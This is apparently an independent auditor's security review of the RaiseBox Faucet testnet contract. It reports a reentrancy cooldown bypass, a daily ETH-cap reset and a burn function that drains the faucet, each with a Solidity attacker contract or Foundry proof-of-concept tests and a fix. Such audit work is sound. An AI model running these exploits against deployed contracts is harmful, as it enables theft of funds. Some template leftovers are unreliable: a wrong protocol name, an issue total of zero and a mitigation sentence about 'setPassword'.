# About

Volodymyr Stetsenko is an independent smart contract security researcher focused on manual
auditing, automated and static analysis, and property-based / fuzz testing and formal verifi-
cation of EVM-based protocols. His work emphasizes rigorous code review, careful reasoning about
protocol assumptions, and identifying high-impact logic, economic, and architectural weaknesses.

I’m continuously sharpening my expertise through deep study, public audit practice, and trans-
parent documentation of my methods. My approach combines manual inspection with a tool-
driven workflow — including static analyzers (e.g., Slither), fuzzers and property-based testing (e.g.,
Echidna, Foundry fuzzing), symbolic checks, invariant assertions, and formal verification where ap-
propriate — to ensure comprehensive coverage of both functional and economic risk vectors.

# Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where we try to find as many vulnerabilities as possible. We can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

# Risk Classification
 
| Severity               | Impact: High | Impact: Medium | Impact: Low |
| ---------------------- | ------------ | -------------- | ----------- |
| **Likelihood: High**   | Critical     | High           | Medium      |
| **Likelihood: Medium** | High         | Medium         | Low         |
| **Likelihood: Low**    | Medium       | Low            | Low         |

## Impact

- High - leads to a significant material loss of assets in the protocol or significantly harms a group of users.

- Medium - leads to a moderate material loss of assets in the protocol or moderately harms a group of users.

- Low - leads to a minor material loss of assets in the protocol or harms a small group of users.

## Likelihood
 
- High - attack path is possible with reasonable assumptions that mimic on-chain conditions, and the cost of the attack is relatively low compared to the amount of funds that can be stolen or lost.

- Medium - only a conditionally incentivized attack vector, but still relatively likely.

- Low - has too many or too unlikely assumptions or requires a significant stake by the attacker with little or no incentive.

## Action required for severity levels
 
- Critical - Must fix as soon as possible (if already deployed)

- High - Must fix (before deployment if not already deployed)

- Medium - Should fix

- Low - Could fix

# Protocol Summary

RaiseBox Faucet is a token drip faucet designed to distribute **1,000 test tokens** to users every **3 days**. Additionally, it provides **0.005 Sepolia ETH** to first-time users. 

The faucet tokens are essential for interacting with the testnet of a future protocol that will exclusively support these specific tokens.


## Roles & Actors

The protocol defines three primary actors with specific permissions and restrictions:

### 1. Owner
The administrative role responsible for contract management and liquidity.
* **Responsibilities:**
    * Deploying the contract implementation.
    * Minting the initial supply and any future token emissions.
    * Burning tokens as required for supply management.
    * Adjusting the daily claim limits.
    * Refilling the Sepolia ETH balance of the contract.
* **Limitations:**
    * Strictly prohibited from claiming faucet tokens.

### 2. Claimer
Standard users interacting with the faucet to receive test assets.
* **Responsibilities:**
    * Can claim tokens by calling the `claimFaucetTokens` function.
* **Limitations:**
    * Does not possess any administrative or owner-defined privileges.

### 3. Donators
External participants supporting the protocol's operation.
* **Responsibilities:**
    * Can donate Sepolia ETH directly to the contract to maintain its liquidity.


# Executive Summary

A time-boxed security review of the PasswordStore protocol was done by Volodymyr Stetsenko, with a focus on the security aspects of the application's smart contracts implementation.

| Attribute               | Details | 
| ---------------------- | ------------ |
| **Protocol**   | Raisebox Faucet     |
| **Auditor** | Volodymyr Stetsenko         |
| **Solidity Version**    | 0.8.18       |
| **Blockchain**   | Ethereum    |
| **Methodology** | Manual Code Review, Static Analysis         |
| **Review Period**    | October 9–16, 2025       |
| **Commit Hash**    | `-//-`       |

## Issues found

| Severity          | Number of issues found |
| ----------------- | ---------------------- |
| High              | 2                      |
| Medium            | 1                      |
| Low               | 0                      |
| Info              | 0                      |
| Gas Optimizations | 0                      |
| Total             | 0                      |


### Scope

The following smart contracts were in scope of the audit:

```
src/
├── RaiseBoxFaucet.sol
├── DeployRaiseBoxFaucet.s.sol

```

# Findings

## High 

### [H-1] Reentrancy in `claimFaucetTokens()` allows bypassing cooldown and claiming tokens multiple times


**Description:** The `claimFaucetTokens()` function violates the Checks-Effects-Interactions (CEI) pattern by performing an external ETH transfer before updating `lastClaimTime`. This allows a malicious contract to re-enter the function during the transfer, bypass the cooldown check, and claim tokens multiple times within a single transaction. 


**Impact:** Any user can deploy a contract with a `receive()` function that calls `claimFaucetTokens()` again. No special conditions or timing required.

**Proof of Concept:** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;
​
contract AttackerContract {
    RaiseBoxFaucet public faucet;
    uint256 public attackCount;
    
    constructor(address _faucet) {
        faucet = RaiseBoxFaucet(_faucet);
    }
    
    // This function is triggered when contract receives ETH
    receive() external payable {
        // Re-enter on first call only (avoid infinite loop)
        if (attackCount == 0) {
            attackCount++;
            faucet.claimFaucetTokens(); // REENTRANCY ATTACK
        }
    }
    
    // Start the attack
    function attack() external {
        attackCount = 0;
        faucet.claimFaucetTokens();
    }
}
```

**Recommended Mitigation:** 
```diff
+ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
​
- contract RaiseBoxFaucet is ERC20, Ownable {
+ contract RaiseBoxFaucet is ERC20, Ownable, ReentrancyGuard {
​
-   function claimFaucetTokens() public {
+   function claimFaucetTokens() public nonReentrant {
        // existing code remains the same
    }
}
```

### [H-2] `dailyDrips` reset in else block bypasses `dailySepEthCap` allowing unlimited ETH withdrawal

**Description:** When `!hasClaimedEth[claimer] && !sepEthDripsPaused` is false, execution jumps to the `else` block, which sets `dailyDrips = 0;`. An old claimer (cooldown passed) can thus reset the per-day ETH usage counter at will. New claimers later the same day will again receive ETH, bypassing the daily cap.
```javascript
  // Vulnerable fragment in claimFaucetTokens()
  if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
      uint256 currentDay = block.timestamp / 24 hours;
​
      if (currentDay > lastDripDay) {
          lastDripDay = currentDay;
          dailyDrips = 0;
      }
​
      if (dailyDrips + sepEthAmountToDrip <= dailySepEthCap
          && address(this).balance >= sepEthAmountToDrip)
      {
          hasClaimedEth[faucetClaimer] = true;
          dailyDrips += sepEthAmountToDrip;
​
          (bool success,) = faucetClaimer.call{value: sepEthAmountToDrip}("");
          require(success, "ETH transfer failed");
      }
  } else {
      // resets daily counter even for non-first-time claimers or when paused
@>    dailyDrips = 0;
  }
```

**Impact:** Anyone who has claimed ETH before can trigger the reset after the 3-day cooldown passes. No special setup or conditions required.


**Proof of Concept:** 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
​
import "forge-std/Test.sol";
import {RaiseBoxFaucet} from "../src/RaiseBoxFaucet.sol";
​
contract DailyDripsResetTest is Test {
    // -------------------- Constants --------------------
    uint256 constant FAUCET_DRIP      = 1000 ether;
    uint256 constant SEP_ETH_PER_USER = 0.01 ether;   // first-time drip
    uint256 constant DAILY_CAP        = 0.02 ether;   // 2 drips/day
    uint256 constant SEED_ETH         = 10 ether;
​
    // -------------------- Actors -----------------------
    address oldUser   = address(0xA11CE); // previously-claimed address
    address newUser1  = address(0xBEEF);  // morning
    address newUser2  = address(0xCAFE);  // morning
    address newUser3  = address(0xD00D);  // morning "third" (should get no ETH before reset)
    address lateUser  = address(0xF00D);  // evening user (should get ETH after reset)
​
    RaiseBoxFaucet faucet;
​
    // -------------------- Setup ------------------------
    function setUp() public {
        faucet = new RaiseBoxFaucet("RB", "RB", FAUCET_DRIP, SEP_ETH_PER_USER, DAILY_CAP);
        vm.deal(address(faucet), SEED_ETH);
​
        // Make oldUser a first-time claimer 4 days ago (so hasClaimedEth[oldUser] = true)
        vm.warp(4 days); // start timeline
        vm.prank(oldUser);
        faucet.claimFaucetTokens(); // consumes 0.01 ETH once
​
        // Assert initial ETH effect: 10 - 0.01 = 9.99
        assertEq(address(faucet).balance, SEED_ETH - SEP_ETH_PER_USER, "seed - first-time drip");
    }
​
    // -------------------- Helpers ----------------------
    function _expectDripped(address claimer) internal {
        // Only check indexed topic (claimer). We skip data (string amount) to avoid tight coupling.
        vm.expectEmit(true, false, false, false);
        emit SepEthDripped(claimer, SEP_ETH_PER_USER);
    }
​
    function _expectSkipped(address claimer) internal {
        // Only check indexed topic (claimer). We skip data (string reason).
        vm.expectEmit(true, false, false, false);
        emit SepEthDripSkipped(claimer, "");
    }
​
    // Mirror faucet events (needed for expectEmit)
    event SepEthDripped(address indexed claimant, uint256 amount);
    event SepEthDripSkipped(address indexed claimant, string reason);
​
    // -------------------- Test -------------------------
    function test_DailyEthCap_BypassViaElseReset() public {
        // Move to Day N morning; pass 3-day cooldown for everyone
        vm.warp(block.timestamp + 3 days + 1 hours);
​
        uint256 beforeMorning = address(faucet).balance;
​
        // Morning: two new users legitimately consume the daily cap (0.02 total)
        _expectDripped(newUser1);
        vm.prank(newUser1);
        faucet.claimFaucetTokens();
​
        _expectDripped(newUser2);
        vm.prank(newUser2);
        faucet.claimFaucetTokens();
​
        // Balance after 2 first-time drips today: -0.02
        assertEq(address(faucet).balance, beforeMorning - 2 * SEP_ETH_PER_USER, "cap consumed by 2 users");
​
        // A third new user the same day should NOT receive ETH (cap reached)
        uint256 beforeThird = address(faucet).balance;
        _expectSkipped(newUser3);
        vm.prank(newUser3);
        faucet.claimFaucetTokens();
        assertEq(address(faucet).balance, beforeThird, "no ETH for 3rd new user before reset");
​
        // Noon: oldUser (not first-time anymore) triggers the buggy else-branch -> dailyDrips = 0
        // This call itself should NOT drip ETH (already claimed in the past), but it resets the counter.
        uint256 beforeReset = address(faucet).balance;
        vm.prank(oldUser);
        faucet.claimFaucetTokens();
        assertEq(address(faucet).balance, beforeReset, "oldUser gets no ETH, only resets counter");
​
        // Evening: another brand-new user should now receive ETH AGAIN the same day (cap bypassed)
        _expectDripped(lateUser);
        vm.prank(lateUser);
        faucet.claimFaucetTokens();
​
        // Check cumulative ETH effect:
        // Initial after setUp: 10 - 0.01 = 9.99
        // Morning 2 users: -0.02 => 9.97
        // Third user: 0 change => 9.97
        // oldUser reset: 0 change => 9.97
        // Evening lateUser: -0.01 => 9.96
        assertEq(address(faucet).balance, SEED_ETH - (SEP_ETH_PER_USER + 2*SEP_ETH_PER_USER + 0 + 0 + SEP_ETH_PER_USER), "bypass visible");
        // i.e., 10 - 0.04 = 9.96
    }
}
```

**Recommended Mitigation:** Add an access control modifier to the `setPassword` function. 

```diff
-} else {
-    // Resets the daily counter for non-first-time / paused callers 
-    dailyDrips = 0;
-}
+}
```

# Medium Risk Findings

### [M-1] burnFaucetTokens sends full faucet balance to owner instead of burning specified amount

**Description:** A faucet `burn` should reduce supply by exactly `amountToBurn` from the faucet’s holdings, leaving the remaining faucet balance intact for user claims (or transfer exactly `amountToBurn` to the burner first, then burn).

```javascript
function burnFaucetTokens(uint256 amountToBurn) public onlyOwner {
    require(amountToBurn <= balanceOf(address(this)), "Faucet Token Balance: Insufficient");
​
    // @> pre-burn transfer uses the FULL faucet balance instead of `amountToBurn`
    // @> This moves ALL reserves to the owner.
    _transfer(address(this), msg.sender, balanceOf(address(this)));
​
    // Burns only the specified amount from the owner's balance.
    _burn(msg.sender, amountToBurn);
}
​
```

**Impact:** The pattern `transfer then burn` is common during maintenance; this flawed implementation will be executed during normal operations, not only under adversarial conditions.

**Proof of Concept:** 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
​
import "forge-std/Test.sol";
import {RaiseBoxFaucet} from "../src/RaiseBoxFaucet.sol";
​
contract BurnFaucetTokensDrainTest is Test {
    // ======== Constants (must align with contract) ========
    string constant NAME = "RaiseBox";
    string constant SYMBOL = "RBOX";
    uint256 constant FAUCET_DRIP = 100 ether;
    uint256 constant SEP_ETH_DRIP = 0.01 ether;
    uint256 constant DAILY_SEP_ETH_CAP = 1 ether;
​
    // From RaiseBoxFaucet: INITIAL_SUPPLY = 1_000_000_000 * 1e18
    uint256 constant INITIAL_SUPPLY = 1_000_000_000 ether;
​
    // Test burn scenarios
    uint256 constant SMALL_BURN = 1_000 ether;
    uint256 constant MEDIUM_BURN = 1_000_000 ether;
​
    // ======== State ========
    RaiseBoxFaucet faucet;
    address owner;
    address user;
​
    // ======== Setup ========
    function setUp() public {
        faucet = new RaiseBoxFaucet(
            NAME,
            SYMBOL,
            FAUCET_DRIP,
            SEP_ETH_DRIP,
            DAILY_SEP_ETH_CAP
        );
        owner = address(this); // test contract is the owner (Ownable(msg.sender))
        user = makeAddr("user"); // valid EOA-like address via forge-std helper
​
        // Sanity checks
        assertEq(
            faucet.balanceOf(address(faucet)),
            INITIAL_SUPPLY,
            "faucet initial balance mismatch"
        );
        assertEq(faucet.balanceOf(owner), 0, "owner should start with zero");
        assertEq(faucet.totalSupply(), INITIAL_SUPPLY, "totalSupply mismatch");
        assertEq(faucet.getOwner(), owner, "owner mismatch");
    }
​
    // ======== Snapshot helpers ========
    struct BurnState {
        uint256 faucetBalance;
        uint256 ownerBalance;
        uint256 totalSupply;
    }
​
    function _snap() internal view returns (BurnState memory s) {
        s.faucetBalance = faucet.balanceOf(address(faucet));
        s.ownerBalance = faucet.balanceOf(owner);
        s.totalSupply = faucet.totalSupply();
    }
​
    // ======== Core PoC ========
​
    /// @notice Small burn drains entire faucet and enriches owner.
    function test_SmallBurn_DrainsFaucet() public {
        BurnState memory before_ = _snap();
        assertGt(
            before_.faucetBalance,
            SMALL_BURN,
            "precondition: faucet > amountToBurn"
        );
​
        faucet.burnFaucetTokens(SMALL_BURN);
​
        uint256 faucetAfter = faucet.balanceOf(address(faucet));
        uint256 ownerAfter = faucet.balanceOf(owner);
        uint256 supplyAfter = faucet.totalSupply();
​
        // Faucet fully drained (BUG)
        assertEq(
            faucetAfter,
            0,
            "BUG: faucet should not be zero after a normal burn"
        );
​
        // Owner receives windfall (BUG)
        assertEq(
            ownerAfter,
            before_.faucetBalance - SMALL_BURN,
            "BUG: owner windfall mismatch"
        );
​
        // totalSupply looks correct (masks the bug)
        assertEq(
            supplyAfter,
            before_.totalSupply - SMALL_BURN,
            "supply must drop by amountToBurn"
        );
    }
​
    /// @notice Burning 1 wei drains the entire faucet.
    function test_BurnOneWei_DrainsAll() public {
        BurnState memory before_ = _snap();
​
        faucet.burnFaucetTokens(1);
​
        assertEq(
            faucet.balanceOf(address(faucet)),
            0,
            "BUG: 1 wei burn drained the faucet"
        );
        assertEq(
            faucet.balanceOf(owner),
            before_.faucetBalance - 1,
            "BUG: owner took faucetBalance - 1"
        );
    }
​
    /// @notice After drain, claim becomes non-functional.
    function test_AfterDrain_ClaimIsNonFunctional() public {
        // Drain first
        faucet.burnFaucetTokens(SMALL_BURN);
​
        // Prepare claim environment
        vm.deal(address(faucet), 1 ether); // give faucet some ETH for drips (not essential here)
        vm.warp(block.timestamp + 4 days); // pass cooldown
        vm.prank(user);
        // Expect revert due to insufficient token balance in faucet
        vm.expectRevert(
            RaiseBoxFaucet.RaiseBoxFaucet_InsufficientContractBalance.selector
        );
        faucet.claimFaucetTokens();
​
        assertEq(faucet.balanceOf(address(faucet)), 0, "faucet remains empty");
    }
​
    /// @notice Edge: burning the entire balance leaves no windfall (all gets burned).
    function test_BurnEntireBalance_EdgeCase() public {
        uint256 bal = faucet.balanceOf(address(faucet));
        faucet.burnFaucetTokens(bal);
​
        assertEq(faucet.balanceOf(address(faucet)), 0, "faucet empty");
        assertEq(
            faucet.balanceOf(owner),
            0,
            "owner gets nothing in this edge case"
        );
        assertEq(faucet.totalSupply(), 0, "entire supply burned");
    }
​
    /// @notice Edge: burning more than balance reverts.
    function test_BurnMoreThanBalance_Reverts() public {
        uint256 bal = faucet.balanceOf(address(faucet));
        vm.expectRevert("Faucet Token Balance: Insufficient");
        faucet.burnFaucetTokens(bal + 1);
    }
​
    /// @notice Only owner can call burn.
    function test_OnlyOwner_CanBurn() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        // For OZ v5 Ownable, this is the precise custom error; otherwise use vm.expectRevert();
        vm.expectRevert(
            abi.encodeWithSignature(
                "OwnableUnauthorizedAccount(address)",
                attacker
            )
        );
        faucet.burnFaucetTokens(SMALL_BURN);
    }
​
    /// @notice Fuzz: any valid amount drains the faucet.
    function testFuzz_AnyAmount_DrainsFaucet(uint256 amount) public {
        uint256 bal = faucet.balanceOf(address(faucet));
        amount = bound(amount, 1, bal);
​
        BurnState memory before_ = _snap();
        faucet.burnFaucetTokens(amount);
​
        assertEq(faucet.balanceOf(address(faucet)), 0, "faucet always drained");
        assertEq(
            faucet.balanceOf(owner),
            before_.faucetBalance - amount,
            "owner always gets windfall"
        );
    }
}
```

**Recommended Mitigation:** 

```diff
- function burnFaucetTokens(uint256 amountToBurn) public onlyOwner {
-     require(amountToBurn <= balanceOf(address(this)), "Faucet Token Balance: Insufficient");
-     // transfer faucet balance to owner first before burning
-     _transfer(address(this), msg.sender, balanceOf(address(this)));
-     _burn(msg.sender, amountToBurn);
- }
+ function burnFaucetTokens(uint256 amount) public onlyOwner {
+     uint256 bal = balanceOf(address(this));
+     require(amount <= bal, "Faucet Token Balance: Insufficient");
+     // Burn directly from faucet reserves to avoid any pre-transfer windfall
+     _burn(address(this), amount);
+ }
```
